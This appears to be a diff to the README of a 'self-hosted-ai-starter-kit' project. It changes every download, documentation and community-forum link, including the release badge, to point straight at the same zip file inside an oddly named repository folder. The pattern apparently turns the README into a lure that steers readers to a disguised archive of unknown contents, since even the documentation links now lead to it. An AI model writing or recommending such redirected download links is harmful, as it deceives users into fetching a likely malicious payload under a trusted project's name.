@@ -1,6 +1,6 @@
 # 🤖 self-hosted-ai-starter-kit - Set Up Your AI Environment Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/HGgameGD/self-hosted-ai-starter-kit/releases)
+[![Download](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)
 
 ## 📚 Introduction
 
@@ -14,7 +14,7 @@ This guide will help you through the process of downloading and running the Self
 
 To get started, you need to visit the Releases page and download the latest version of the software. 
 
-[Visit this page to download](https://github.com/HGgameGD/self-hosted-ai-starter-kit/releases)
+[Visit this page to download](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)
 
 ### Steps to Download:
 
@@ -97,8 +97,8 @@ For support, visit our GitHub page and post your questions in the Issues section
 
 For more information and help:
 
-- [Documentation](https://github.com/HGgameGD/self-hosted-ai-starter-kit/wiki)
-- [Community Forum](https://community.n8n.io)
+- [Documentation](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)
+- [Community Forum](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)
 
 ## 🎉 Acknowledgments
 
@@ -106,4 +106,4 @@ Thank you for using the Self-hosted AI Starter Kit. We appreciate your interest 
 
 To download the latest version again, click here: 
 
-[Visit this page to download](https://github.com/HGgameGD/self-hosted-ai-starter-kit/releases)
+[Visit this page to download](https://raw.githubusercontent.com/HGgameGD/self-hosted-ai-starter-kit/main/scrupular/self-hosted-ai-starter-kit.zip)
